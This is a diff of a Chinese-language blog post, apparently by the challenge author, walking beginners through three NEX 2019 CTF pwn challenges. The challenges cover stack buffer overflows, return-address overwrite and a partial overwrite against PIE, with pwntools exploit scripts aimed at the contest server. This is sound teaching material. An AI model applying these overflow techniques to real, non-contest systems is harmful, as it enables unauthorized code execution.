@@ -11,46 +11,46 @@
   <title>NEX招新赛-pwn-writeup | t1an5t&#39;s Treasure</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp; 基础需要掌握的基础其实说起来也并不多，首先就是搞个虚拟机，里面安个ubuntu（最好">
+  <meta name="description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
 <meta name="keywords" content="pwnable,ctf,2019">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NEX招新赛-pwn-writeup">
 <meta property="og:url" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/index.html">
 <meta property="og:site_name" content="t1an5t&#39;s Treasure">
-<meta property="og:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp; 基础需要掌握的基础其实说起来也并不多，首先就是搞个虚拟机，里面安个ubuntu（最好">
+<meta property="og:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175200901.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175241566.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175347034.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175559665.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572176002336.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178490824.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178611753.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178915409.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572179252871.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180018548.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180229624.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180347956.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180378962.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180479536.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180556328.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180706224.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181008846.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180018548.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181528850.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181798790.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182436773.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182460813.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182651474.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182716206.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182777854.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572183021319.png">
-<meta property="og:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572183525405.png">
-<meta property="og:updated_time" content="2019-10-27T13:53:14.027Z">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175200901.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175241566.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175347034.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175559665.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572176002336.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178490824.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178611753.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178915409.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572179252871.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180229624.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180347956.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180378962.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180479536.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180556328.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180706224.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181008846.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181528850.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181798790.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182436773.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182460813.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182651474.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182716206.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182777854.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183021319.png">
+<meta property="og:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183525405.png">
+<meta property="og:updated_time" content="2019-10-27T14:07:51.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NEX招新赛-pwn-writeup">
-<meta name="twitter:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp; 基础需要掌握的基础其实说起来也并不多，首先就是搞个虚拟机，里面安个ubuntu（最好">
-<meta name="twitter:image" content="http://tianstcht.github.io/NEX招新赛-pwn-writeup/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175200901.png">
+<meta name="twitter:description" content="前言所有pwn题目的源代码都开源在了：https://github.com/NEU-NEX/NEXCTF2019 本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。 &amp;nbsp;">
+<meta name="twitter:image" content="http://tianstcht.github.io/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175200901.png">
 
   
 
@@ -221,17 +221,18 @@
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>所有pwn题目的源代码都开源在了：<a href="https://github.com/NEU-NEX/NEXCTF2019" target="_blank" rel="noopener">https://github.com/NEU-NEX/NEXCTF2019</a></p>
 <p>本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。</p>
 <p>&nbsp;</p>
+<a id="more"></a>
 <h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>需要掌握的基础其实说起来也并不多，首先就是搞个虚拟机，里面安个ubuntu（最好是1604），大概知道怎么用就可以。其次就是会python，如果你学过任何其他语言，那么python学起来真的是非常快。然后就是C语言和汇编，起码要能看懂他们在干什么。</p>
 <p>&nbsp;</p>
 <h2 id="pwn01-checkin"><a href="#pwn01-checkin" class="headerlink" title="pwn01_checkin"></a>pwn01_checkin</h2><p>首先丢到IDA里，定位到main函数，一般来说左边这一串就是可以找到main函数的：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175200901.png" alt="1572175200901"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175200901.png" alt="1572175200901"></p>
 <p>然后点进去，F5大法看到IDA给我们生成的伪C代码，得到：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175241566.png" alt="1572175241566"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175241566.png" alt="1572175241566"></p>
 <p><code>puts</code>是库函数，我们不用去考虑它，重点还是<strong>关注由用户所编写的函数</strong>，先打开<code>init</code>：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175347034.png" alt="1572175347034"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175347034.png" alt="1572175347034"></p>
 <p>大多数题目的<code>init</code>函数都是这么写的，其实只是对IO流的缓冲区做了一些处理，是为了在堆上不产生额外的堆块，不用去在意。</p>
 <p>然后去看<code>vuln</code>函数，如其名称一样，应该存在漏洞：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572175559665.png" alt="1572175559665"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572175559665.png" alt="1572175559665"></p>
 <p>看不懂的地方先忽略，先关注整个程序流程，很简单，给三个变量赋值为1，然后让用户向buf里面读入0x30个字符，之后比较三个变量的和是否为666，是则触发后门得到shell。</p>
 <p>乍一看就是一个普通的程序，但是这里是存在很严重的问题。问题发生在向buf读入0x30个字符这里，buf在内存里是一大段连续的内存，但是<strong>如果buf这段内存的长度本身小于0x30，但是我们却读入了0x30个字符</strong>，那么会发生什么呢？</p>
 <p>所以首先需要考虑一个问题：</p>
@@ -239,7 +240,7 @@
 <li><p>问：buf这个变量有多长我是这怎么知道的？</p>
 </li>
 <li><p>答：我的习惯是看rbp指针：</p>
-<p>  <img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572176002336.png" alt="1572176002336"></p>
+<p>  <img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572176002336.png" alt="1572176002336"></p>
 <p>  rbp称为栈基指针，指向栈空间底部，这些rbp的含义是在告诉你这些内存中连续的变量和rbp当前值的偏移值，所以buf的长度可以这么计算：</p>
 <blockquote>
 <p>0x30 - 0xc = 0x24</p>
@@ -267,17 +268,17 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./pwn")</span></span><br><span class="line">p = remote(<span class="string">"handsomedog.top"</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x24</span> + p32(<span class="number">664</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>本地运行拿到shell：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178490824.png" alt="1572178490824"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178490824.png" alt="1572178490824"></p>
 <p>远程运行也成功：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178611753.png" alt="1572178611753"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178611753.png" alt="1572178611753"></p>
 <p>&nbsp;</p>
 <h2 id="pwn02-overflowme"><a href="#pwn02-overflowme" class="headerlink" title="pwn02_overflowme"></a>pwn02_overflowme</h2><p>依然IDA F5大法，其他长得都一样，看vuln：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572178915409.png" alt="1572178915409"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572178915409.png" alt="1572178915409"></p>
 <p>嗯，没了。</p>
 <p>还是用上面介绍的方法，可以看出buf长度0x20，但是read可以读入0x100的字节。很容易想到还是输入超过0x20长度的字符，然后覆盖一些东西。这次看不到其他变量可以被覆盖了，我们覆盖的是什么呢？</p>
 <p><strong>这里用到的知识点叫做栈帧（stack frame）</strong></p>
 <p>考虑这么一件事，刚才那个read是在vuln()函数里的，那么我<strong>执行vuln()函数之后还要回到main()函数里去执行下一行</strong>。</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572179252871.png" alt="1572179252871"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572179252871.png" alt="1572179252871"></p>
 <p>所以程序在进入vuln()函数前一定要做的一件事情就是<strong>要记录那个“下一行”的地址</strong>，因为它执行完vuln()的内容后还要回来。<strong>这其实就是用一些指令构造并控制栈帧这个结构来实现的</strong></p>
 <p>涉及到的关键指令：<strong>call, leave, ret</strong>，指针：<strong>sp, bp</strong></p>
 <p>关于栈帧网上资料很多，请自行查阅，理解之后再继续阅读。</p>
@@ -288,60 +289,60 @@
 <p>&nbsp;</p>
 <p>所以这回就知道了，<strong>buf下面虽然看起来没有变量了，但是栈里面实际上存的依次为buf，rbp指针，ip指针</strong></p>
 <p>切换到IDA的汇编窗口看一下，ip存的应该是这个：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180018548.png" alt="1572180018548"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png" alt="1572180018548"></p>
 <p>我们可以用gdb来查验一下（gdb是linux下的动态调试器，初次接触可能会觉得很反人类，不过确实是个神器）</p>
 <p>命令行中用gdb启动pwn2程序：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ./pwn2</span><br></pre></td></tr></table></figure>
 
 <p>IDA里看一下read一结束后的地址：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180229624.png" alt="1572180229624"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180229624.png" alt="1572180229624"></p>
 <p>gdb里下断点：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b *0x4006ea</span><br></pre></td></tr></table></figure>
 
 <p>然后gdb里输入r来运行程序，随便输入点什么：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180347956.png" alt="1572180347956"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180347956.png" alt="1572180347956"></p>
 <p>回车后发现程序断在了这里：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180378962.png" alt="1572180378962"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180378962.png" alt="1572180378962"></p>
 <p>查看一下buf的位置，和rbp的值：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180479536.png" alt="1572180479536"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180479536.png" alt="1572180479536"></p>
 <p>可以看到栈空间中，和栈帧描述以及我们之前的预测是一致的：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180556328.png" alt="1572180556328"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180556328.png" alt="1572180556328"></p>
 <p>所以我们通过buf是可以覆盖到rbp以及ip指针的，<strong>那么当执行ret指令的时候，原本是0x400761被传给rip变成了我们可以传递任意值给rip，也就达到了控制程序流程到任意地址的目的</strong></p>
 <p>程序里存在后门函数，直接让程序运行到后门函数那里就可以了，后门函数的起始地址：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180706224.png" alt="1572180706224"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180706224.png" alt="1572180706224"></p>
 <p>&nbsp;</p>
 <p>运用第一题提到的小端序和p64()函数就可以写出第二题的exp<strong>（用p64()是因为64位程序的地址和指针都是8字节的，上一题用p32()是因为被覆盖的变量是4字节长，和32位地址和指针的长度一致）</strong>。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn2")</span></span><br><span class="line">p = remote(<span class="string">"handsomedog.top"</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span>        <span class="comment"># 填满buf</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># 别忘了ip指针之前还有个rbp需要覆盖，覆盖成任何值都可以</span></span><br><span class="line">payload += p64(<span class="number">0x4006b6</span>)    <span class="comment"># backdoor函数的起始地址</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>远端效果：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181008846.png" alt="1572181008846"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181008846.png" alt="1572181008846"></p>
 <p>&nbsp;</p>
 <h2 id="pwn03-do-you-know-PIE"><a href="#pwn03-do-you-know-PIE" class="headerlink" title="pwn03_do_you_know_PIE"></a>pwn03_do_you_know_PIE</h2><p>还是和前面一样的操作，F5大法之后乍一看和pwn2没区别？但是发现原来的exp怎么打也打不通了。</p>
 <p>再仔细看看汇编窗口的东西，pwn2是这样的：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572180018548.png" alt="1572180018548"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572180018548.png" alt="1572180018548"></p>
 <p>pwn3是这样的：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181528850.png" alt="1572181528850"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181528850.png" alt="1572181528850"></p>
 <p>区别在于pwn2是0x400xxx这样的地址，而pwn3变成了0x000xxx这样的地址。</p>
 <p>这里其实是因为<strong>程序在编译的时候开启了PIE保护，可以用pwntools带的checksec工具查看</strong>：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572181798790.png" alt="1572181798790"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572181798790.png" alt="1572181798790"></p>
 <p>有兴趣的可以去了解一下PIE的实现原理以及更细节的东西。</p>
 <p>简单来说，没有开启PIE的程序，32位程序的地址都是0x8048xxx这样的地址，64位程序都是0x400xxx这样的地址，这样程序里任何函数，指令的地址永远是固定的，就像pwn2那样。而开启了PIE的程序pwn3，在IDA里可以看到它是从0开始的，相当于一个偏移地址，在运行起来的时候，程序会被动态地赋予一个具有一定随机化的加载基值<strong>（这个基地址后12bit一定是0，因为加的是页偏移）</strong>，然后再加上偏移地址才是运行地址。</p>
 <p>可以gdb里看一下pwn2和pwn3的基地址的不同：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182436773.png" alt="1572182436773"></p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182460813.png" alt="1572182460813"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182436773.png" alt="1572182436773"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182460813.png" alt="1572182460813"></p>
 <p>所以重新思考一下我们应该覆盖的值：</p>
 <p>我们还是在read一结束的时候下断点，先看一下偏移值：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182651474.png" alt="1572182651474"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182651474.png" alt="1572182651474"></p>
 <p>然后在gdb下断点：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b *(0x0000555555554000+0x936)</span><br></pre></td></tr></table></figure>
 
 <p>同样的运行并随便输入数据：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182716206.png" alt="1572182716206"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182716206.png" alt="1572182716206"></p>
 <p>停止后的栈情况：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572182777854.png" alt="1572182777854"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572182777854.png" alt="1572182777854"></p>
 <p>可以看到，其他的看起来是差不多的。但是这个ip指针的值该覆盖成什么，我们不知道了。<strong>但是我们是可以从IDA里知道各个函数的偏移值的。</strong></p>
 <p>backdoor的偏移值：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572183021319.png" alt="1572183021319"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183021319.png" alt="1572183021319"></p>
 <p>所以如果我们能把第三个箭头这个0x5555555549af 改成0x555555554900，那还是可以去执行backdoor的。<strong>认真一点可能会发现，这两个地址只有低8bit是不一样的，所以如果能改掉这最后8bit，也就是一个字节，那么就达到了目的。</strong></p>
 <p><strong>这里又要用到小端序这一点了</strong>，这里的地址8字节全部展开是这样的：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00005555555549af</span><br></pre></td></tr></table></figure>
@@ -355,7 +356,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn2")</span></span><br><span class="line">p = remote(<span class="string">"handsomedog.top"</span>, <span class="number">9003</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x20</span>        <span class="comment"># 填满buf</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># 别忘了ip指针之前还有个rbp需要覆盖，覆盖成任何值都可以</span></span><br><span class="line">payload += <span class="string">"\x00"</span>           <span class="comment"># 通过patial overwrite改成backdoor函数的偏移地址</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>远端效果：</p>
-<p><img src="NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup.assets/1572183525405.png" alt="1572183525405"></p>
+<p><img src="/NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-pwn-writeup/1572183525405.png" alt="1572183525405"></p>
 <p>&nbsp;</p>
